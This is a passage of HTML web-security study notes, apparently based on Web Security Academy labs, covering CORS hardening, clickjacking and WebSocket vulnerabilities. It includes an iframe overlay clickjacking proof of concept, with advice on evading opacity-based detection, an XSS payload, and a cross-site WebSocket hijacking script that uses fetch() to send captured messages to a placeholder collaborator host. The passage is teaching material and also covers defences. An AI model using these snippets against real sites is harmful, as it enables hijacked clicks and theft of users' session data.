                      <li style="margin-bottom: 10px;">CORS headers should be properly defined in respect of trusted origins for private and public servers.</li>
                    </ul>
                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Avoid wildcards in internal networks</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Avoid using wildcards in internal networks.</li>
                      <li style="margin-bottom: 10px;">Trusting network configuration alone to protect internal resources is not sufficient when internal browsers can access untrusted external domains.</li>
                    </ul>
                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">CORS is not a substitute for server-side security policies</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">CORS defines browser behaviors and is never a replacement for server-side protection of sensitive data - an attacker can directly forge a request from any trusted origin.</li>
                      <li style="margin-bottom: 10px;">Therefore, web servers should continue to apply protections over sensitive data, such as authentication and session management, in addition to properly configured CORS.</li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Resources &rarr;</h2>
                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin-bottom: 40px;">
                      <a href="https://www.notion.so/Vulnerabilities-arising-from-CORS-configuration-issues" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">CORS Config Issues <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Writeups" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Writeups <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Notes" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Notes <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                    </div>
                  </div>
                </div>
              </div>
            </article>

            <article class="section">
              <div class="section__title">
                <h2 class="section__title__text">
                  Clickjacking (UI Redressing)
                </h2>
                <span><i class="fa-solid fa-arrow-down" style="color: #7380ce; font-size: large;"></i></span>
              </div>

              <div class="section__text">
                <div style="width: 100%; margin: 0; padding: 0; background-color: var(--color-background, #ffffff); color: var(--color-dark, #1f2937); font-family: 'Segoe UI', Tahoma, sans-serif; line-height: 1.7; transition: all 0.3s ease;">
                  <div style="padding: 40px 6%;">
                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-bottom: 20px;">&rarr; What is clickjacking? &rarr;</h2>
                    <p style="font-size: 1.2rem; margin-bottom: 20px;">Clickjacking is an <strong>interface-based attack</strong> in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website.</p>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Consider the following example &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">A web user accesses a decoy website (perhaps this is a link provided by an email) and clicks on a button to win a prize. Unknowingly, they have been deceived by an attacker into pressing an alternative hidden button and this results in the payment of an account on another site.</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 20px;">&rarr; This attack differs from a CSRF attack in that the user is required to perform an action such as a button click whereas a CSRF attack depends upon forging an entire request without the user's knowledge or input.</p>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">CSRF Token &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Protection against CSRF attacks is often provided by the use of a CSRF token: a session-specific, single-use number or nonce.</li>
                      <li style="margin-bottom: 10px;"><strong>Clickjacking attacks are not mitigated by the CSRF token</strong> as a target session is established with content loaded from an authentic website and with all requests happening on-domain.</li>
                      <li style="margin-bottom: 10px;">CSRF tokens are placed into requests and passed to the server as part of a normally behaved session.</li>
                      <li style="margin-bottom: 10px;">The difference compared to a normal user session is that the process occurs within a hidden <code>iframe</code>.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Causes &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Clickjacking occurs when a web application allows its pages to be embedded inside another site and does not implement UI protection controls.</li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; How to construct a basic clickjacking attack? &rarr;</h2>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;"><strong>&rarr; Clickjacking attacks use CSS to create and manipulate layers.</strong></p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">The attacker incorporates the target website as an <code>iframe</code> layer overlaid on the decoy website.</li>
                    </ul>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">&lt;head&gt;
	&lt;style&gt;
		#target_website {
			position:relative;
			width:128px;
			height:128px;
			opacity:0.00001;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:300px;
			height:400px;
			z-index:1;
			}
	&lt;/style&gt;
&lt;/head&gt;
...
&lt;body&gt;
	&lt;div id="decoy_website"&gt;
	...decoy web content here...
	&lt;/div&gt;
	&lt;iframe id="target_website" src="https://vulnerable-website.com"&gt;
	&lt;/iframe&gt;
&lt;/body&gt;

---------------------------------------------------------------
&lt;style&gt;
    iframe {
        position: relative;
        width: 1000px;
        height: 700px;
        opacity: 0.00001;         
        border: none;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 515px;             
        left: 60px;             
        z-index: 1;
               
     
    }
&lt;/style&gt;

&lt;div&gt;CLICK ME&lt;/div&gt;

&lt;iframe src="https://0a7400e504690956814e11e9005500a1.web-security-academy.net/my-account"&gt;&lt;/iframe&gt;</code>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">The target website <code>iframe</code> is positioned within the browser so that there is a precise overlap of the target action with the decoy website using appropriate width and height position values.</li>
                      <li style="margin-bottom: 10px;">Absolute and relative position values are used to ensure that the target website accurately overlaps the decoy regardless of screen size, browser type and platform. The z-index determines the stacking order of the <code>iframe</code> and website layers.</li>
                      <li style="margin-bottom: 10px;">The opacity value is defined as 0.0 (or close to 0.0) so that the <code>iframe</code> content is transparent to the user. Browser clickjacking protection might apply threshold-based <code>iframe</code> transparency detection.</li>
                      <li style="margin-bottom: 10px;">The attacker selects opacity values so that the desired effect is achieved without triggering protection behaviors.</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 20px;">&rarr; Also can use this web app <a href="https://sa.my/quickjack/quickjack.html" style="color: #2563eb;">https://sa.my/quickjack/quickjack.html</a> in the attack.</p>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Clickbandit &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Although you can manually create a clickjacking proof of concept as described above, this can be fairly tedious and time-consuming in practice.</li>
                      <li style="margin-bottom: 10px;">When you're testing for clickjacking in the wild, we recommend using Burp's Clickbandit tool instead.</li>
                      <li style="margin-bottom: 10px;">This lets you use your browser to perform the desired actions on the frameable page, then creates an HTML file containing a suitable clickjacking overlay.</li>
                      <li style="margin-bottom: 10px;">You can use this to generate an interactive proof of concept in a matter of seconds, without having to write a single line of HTML or CSS.</li>
                    </ul>

                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">(1) Setting up Burp Clickbandit &rarr;</p>
                    <ol style="font-size: 1.2rem; padding-left: 30px;">
                      <li style="margin-bottom: 10px;">Go to the top-level <strong>Burp</strong> menu and select <strong>Burp Clickbandit</strong>.</li>
                      <li style="margin-bottom: 10px;">Click <strong>Copy Clickbandit to clipboard</strong> to copy the Clickbandit script.</li>
                      <li style="margin-bottom: 10px;">In your browser, visit the web page that you want to test.</li>
                      <li style="margin-bottom: 10px;">In your browser, open the developer console. This might be called <strong>Developer tools</strong> or <strong>JavaScript console</strong>.</li>
                      <li style="margin-bottom: 10px;">Paste the Clickbandit script into the developer console, and press enter.</li>
                    </ol>
                    <p style="font-size: 1.2rem; margin-bottom: 20px;">The <code>Clickbandit</code> banner appears at the top of the browser window.</p>

                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">(2) Running an attack &rarr;</p>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">To run a clickjacking attack using Burp <code>Clickbandit</code>:</p>
                    <ol style="font-size: 1.2rem; padding-left: 30px;">
                      <li style="margin-bottom: 10px;">Click <strong>Start</strong> to load the website.</li>
                      <li style="margin-bottom: 10px;">Click around the site, mimicking the actions that a victim user might perform. This is recorded by <code>Clickbandit</code>.</li>
                      <li style="margin-bottom: 10px;">Click <strong>Finish</strong> to complete your attack.</li>
                    </ol>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">The target page handles clicks in the normal way. To disable this, select <strong>Disable click actions</strong>.</p>
                    <p style="font-size: 1.2rem; margin-bottom: 20px;">To avoid frame busters, select <strong>Sandbox <code>iframe</code></strong>. This adds the sandbox attribute to the <code>iframe</code>.</p>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; How to prevent clickjacking attacks? &rarr;</h2>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; We have discussed a commonly encountered browser-side prevention mechanism, namely frame busting scripts.</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">However, we have seen that it is often straightforward for an attacker to circumvent these protections.</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;"><strong>&rarr; Consequently, server driven protocols have been devised that constrain browser <code>iframe</code> usage and mitigate against clickjacking.</strong></p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Two mechanisms for server-side clickjacking protection are <strong><code>X-Frame-Options</code> and <code>Content Security Policy</code>.</strong></li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">(1) X-Frame-Options &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;"><code>X-Frame-Options</code> was originally introduced as an unofficial response header in Internet Explorer 8 and it was rapidly adopted within other browsers</li>
                      <li style="margin-bottom: 10px;"><strong>It is an HTTP response header that controls whether a page can be framed.</strong></li>
                    </ul>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">X-Frame-Options: deny
X-Frame-Options: sameorigin
X-Frame-Options: allow-from https://normal-website.com</code>
                    <div style="overflow-x: auto; margin-bottom: 20px;">
                      <table style="width: 100%; border-collapse: collapse; font-size: 1.2rem; text-align: left; background-color: var(--color-white, #f3f4f6); box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); border-radius: 8px; overflow: hidden;">
                        <thead style="background-color: #2563eb; color: #ffffff;">
                          <tr>
                            <th style="padding: 15px; border-bottom: 2px solid #e5e7eb;">Directive</th>
                            <th style="padding: 15px; border-bottom: 2px solid #e5e7eb;">Meaning</th>
                          </tr>
                        </thead>
                        <tbody>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><code>DENY</code></td>
                            <td style="padding: 15px;">Page cannot be framed by anyone</td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><code>SAMEORIGIN</code></td>
                            <td style="padding: 15px;">Only same-origin pages can frame it</td>
                          </tr>
                          <tr>
                            <td style="padding: 15px;"><code>ALLOW-FROM https://site.com</code></td>
                            <td style="padding: 15px;">Only specific site can frame it</td>
                          </tr>
                        </tbody>
                      </table>
                    </div>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; <code>X-Frame-Options</code> is not implemented consistently across browsers (the <code>allow-from</code> directive is not supported in Chrome version 76 or Safari 12 for example).</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;"><strong>However, when properly applied in conjunction with Content Security Policy as part of a multi-layer defense strategy it can provide effective protection against clickjacking attacks.</strong></li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">(2) Content Security Policy (CSP) &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;"><strong>HTTP response Header</strong></li>
                      <li style="margin-bottom: 10px;">Used to add additional Security layer, mitigate against attacks same &lt; XSS &gt;</li>
                      <li style="margin-bottom: 10px;"><strong>control which resources &lt;domain, sources&gt; (e.g., scripts, styles, images) the browser is allowed to load and execute on page.</strong></li>
                      <li style="margin-bottom: 10px;">It consists of a series of instructions from a website to a browser</li>
                      <li style="margin-bottom: 10px;">It should be set on all responses to all requests, not just the main document.</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; detection and prevention mechanism that provides mitigation against attacks such as XSS and clickjacking.</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">CSP is usually implemented in the web server as a return header of the form &rarr;</li>
                    </ul>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">Content-Security-Policy: policy</code>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">where policy is a string of policy directives separated by semicolons.</li>
                      <li style="margin-bottom: 10px;">The CSP provides the client browser with information about permitted sources of web resources that the browser can apply to the detection and interception of malicious behaviors.</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; The recommended clickjacking protection is to incorporate the <code>frame-ancestors</code> directive in the application's Content Security Policy.</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">The <code>frame-ancestors 'none'</code> directive is similar in behavior to the <code>X-Frame-Options deny</code> directive.</li>
                      <li style="margin-bottom: 10px;">The <code>frame-ancestors 'self'</code> directive is broadly equivalent to the X-Frame-Options <code>sameorigin</code> directive.</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; The following CSP whitelists frames to the same domain only &rarr;</p>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">Content-Security-Policy: frame-ancestors 'self';</code>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Alternatively, framing can be restricted to named sites &rarr;</li>
                    </ul>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">Content-Security-Policy: frame-ancestors normal-website.com;</code>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">To be effective against clickjacking and XSS, CSPs need careful development, implementation and testing and should be used as part of a multi-layer defense strategy.</li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Resources &rarr;</h2>
                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin-bottom: 40px;">
                      <a href="https://www.notion.so/Attacks" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Attacks <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Writeups" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Writeups <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                    </div>
                  </div>
                </div>
              </div>
            </article>

            <article class="section">
              <div class="section__title">
                <h2 class="section__title__text">
                  WebSockets
                </h2>
                <span><i class="fa-solid fa-arrow-down" style="color: #7380ce; font-size: large;"></i></span>
              </div>

              <div class="section__text">
                <div style="width: 100%; margin: 0; padding: 0; background-color: var(--color-background, #ffffff); color: var(--color-dark, #1f2937); font-family: 'Segoe UI', Tahoma, sans-serif; line-height: 1.7; transition: all 0.3s ease;">
                  <div style="padding: 40px 6%;">
                    
                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-bottom: 20px;">&rarr; Manipulating WebSocket traffic &rarr;</h2>
                    <p style="font-size: 1.2rem; margin-bottom: 20px;">Finding WebSockets security vulnerabilities generally involves manipulating them in ways that the application doesn't expect.</p>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">(1) Intercepting and modifying WebSocket messages &rarr;</h3>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; You can use Burp Proxy to intercept and modify WebSocket messages, as follows &rarr;</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Open Burp's browser.</li>
                      <li style="margin-bottom: 10px;">Browse to the application function that uses WebSockets.</li>
                      <li style="margin-bottom: 10px;">You can determine that WebSockets are being used by using the application and looking for entries appearing in the WebSockets history tab within Burp Proxy.</li>
                      <li style="margin-bottom: 10px;">In the Intercept tab of Burp Proxy, ensure that interception is turned on.</li>
                      <li style="margin-bottom: 10px;">When a WebSocket message is sent from the browser or server, it will be displayed in the Intercept tab for you to view or modify.</li>
                      <li style="margin-bottom: 10px;">Press the Forward button to forward the message.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">(2) Replaying and generating new WebSocket messages &rarr;</h3>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; As well as intercepting and modifying WebSocket messages on the fly, you can replay individual messages and generate new messages.</p>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; You can do this using Burp Repeater &rarr;</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">In Burp Proxy, select a message in the WebSockets history, or in the Intercept tab, and choose "Send to Repeater" from the context menu.</li>
                      <li style="margin-bottom: 10px;">In Burp Repeater, you can now edit the message that was selected, and send it over and over.</li>
                      <li style="margin-bottom: 10px;">You can enter a new message and send it in either direction, to the client or server.</li>
                      <li style="margin-bottom: 10px;">In the "History" panel within Burp Repeater, you can view the history of messages that have been transmitted over the WebSocket connection. This includes messages that you have generated in Burp Repeater, and also any that were generated by the browser or server via the same connection.</li>
                      <li style="margin-bottom: 10px;">If you want to edit and resend any message in the history panel, you can do this by selecting the message and choosing "Edit and resend" from the context menu.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">(3) Manipulating WebSocket connections &rarr;</h3>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; As well as manipulating WebSocket messages, it is sometimes necessary to manipulate the WebSocket handshake that establishes the connection.</p>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;"><strong>&rarr; There are various situations in which manipulating the WebSocket handshake might be necessary &rarr;</strong></p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">It can enable you to reach more attack surface.</li>
                      <li style="margin-bottom: 10px;">Some attacks might cause your connection to drop so you need to establish a new one.</li>
                      <li style="margin-bottom: 10px;">Tokens or other data in the original handshake request might be stale and need updating.</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;"><strong>You can manipulate the WebSocket handshake using Burp Repeater &rarr;</strong></p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Send a WebSocket message to Burp Repeater as already described.</li>
                      <li style="margin-bottom: 10px;">In Burp Repeater, click on the pencil icon next to the WebSocket URL. This opens a wizard that lets you attach to an existing connected WebSocket, clone a connected WebSocket, or reconnect to a disconnected WebSocket.</li>
                      <li style="margin-bottom: 10px;">If you choose to clone a connected WebSocket or reconnect to a disconnected WebSocket, then the wizard will show full details of the WebSocket handshake request, which you can edit as required before the handshake is performed.</li>
                      <li style="margin-bottom: 10px;">When you click "Connect", Burp will attempt to carry out the configured handshake and display the result. If a new WebSocket connection was successfully established, you can then use this to send new messages in Burp Repeater.</li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; WebSockets security vulnerabilities &rarr;</h2>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;"><strong>In principle, practically any web security vulnerability might arise in relation to WebSockets &rarr;</strong></p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">User-supplied input transmitted to the server might be processed in unsafe ways, leading to vulnerabilities such as SQL injection or XML external entity injection.</li>
                      <li style="margin-bottom: 10px;">Some blind vulnerabilities reached via WebSockets might only be detectable using out-of-band (OAST) techniques.</li>
                      <li style="margin-bottom: 10px;">If attacker-controlled data is transmitted via WebSockets to other application users, then it might lead to XSS or other client-side vulnerabilities.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">(1) Manipulating WebSocket messages to exploit vulnerabilities &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">The majority of input-based vulnerabilities affecting WebSockets can be found and exploited by tampering with the contents of WebSocket messages.</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; For example, suppose a chat application uses WebSockets to send chat messages between the browser and the server.</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">When a user types a chat message, a WebSocket message like the following is sent to the server &rarr;</li>
                    </ul>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">{"message":"Hello Carlos"}</code>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">The contents of the message are transmitted (again via WebSockets) to another chat user, and rendered in the user's browser as follows &rarr;</li>
                    </ul>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">&lt;td&gt;Hello Carlos&lt;/td&gt;</code>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">In this situation, provided no other input processing or defenses are in play, an attacker can perform a proof-of-concept XSS attack by submitting the following WebSocket message &rarr;</li>
                    </ul>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">{"message":"&lt;img src=1 onerror='alert(1)'&gt;"}</code>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">(2) Manipulating the WebSocket handshake to exploit vulnerabilities &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Some WebSockets vulnerabilities can only be found and exploited by manipulating the WebSocket handshake.</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;"><strong>&rarr; these vulnerabilities tend to involve design flaws, such as &rarr;</strong></p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Misplaced trust in HTTP headers to perform security decisions, such as the <code>X-Forwarded-For</code> header.</li>
                      <li style="margin-bottom: 10px;">Flaws in session handling mechanisms, since the session context in which WebSocket messages are processed is generally determined by the session context of the handshake message.</li>
                      <li style="margin-bottom: 10px;">Attack surface introduced by custom HTTP headers used by the application.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">(3) Cross-site WebSocket hijacking &rarr;</h3>
                    
                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">What is cross-site WebSocket hijacking?</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;"><strong>Cross-site WebSocket hijacking (also known as cross-origin WebSocket hijacking)</strong></li>
                      <li style="margin-bottom: 10px;">involves a cross-site request forgery (CSRF) vulnerability on a WebSocket handshake.</li>
                      <li style="margin-bottom: 10px;">It arises when the WebSocket handshake request relies solely on HTTP cookies for session handling and does not contain any CSRF tokens or other unpredictable values.</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; An attacker can create a malicious web page on their own domain which establishes a cross-site WebSocket connection to the vulnerable application.</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">The application will handle the connection in the context of the victim user's session with the application.</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; The attacker's page can then send arbitrary messages to the server via the connection and read the contents of messages that are received back from the server. This means that, unlike regular CSRF, the attacker gains two-way interaction with the compromised application.</p>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; the payload can used &rarr;</p>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">&lt;script&gt;
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
&lt;/script&gt;</code>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Replace <code>your-websocket-url</code> with the URL from the WebSocket handshake. Make sure you change the protocol from <code>https://</code> to <code>wss://</code>. Replace <code>your-collaborator-url</code> with a payload generated by Burp Collaborator.</li>
                    </ul>

                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">What is the impact of cross-site WebSocket hijacking?</p>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; A successful cross-site WebSocket hijacking attack will often enable an attacker to &rarr;</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;"><strong>Perform unauthorized actions masquerading as the victim user.</strong> As with regular CSRF, the attacker can send arbitrary messages to the server-side application. If the application uses client-generated WebSocket messages to perform any sensitive actions, then the attacker can generate suitable messages cross-domain and trigger those actions.</li>
                      <li style="margin-bottom: 10px;"><strong>Retrieve sensitive data that the user can access.</strong> Unlike with regular CSRF, cross-site WebSocket hijacking gives the attacker two-way interaction with the vulnerable application over the hijacked WebSocket. If the application uses server-generated WebSocket messages to return any sensitive data to the user, then the attacker can intercept those messages and capture the victim user's data.</li>
                    </ul>

                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">Performing a cross-site WebSocket hijacking attack &rarr;</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Since a cross-site WebSocket hijacking attack is essentially a CSRF vulnerability on a WebSocket handshake, the first step to performing an attack is to review the WebSocket handshakes that the application carries out and determine whether they are protected against CSRF.</li>
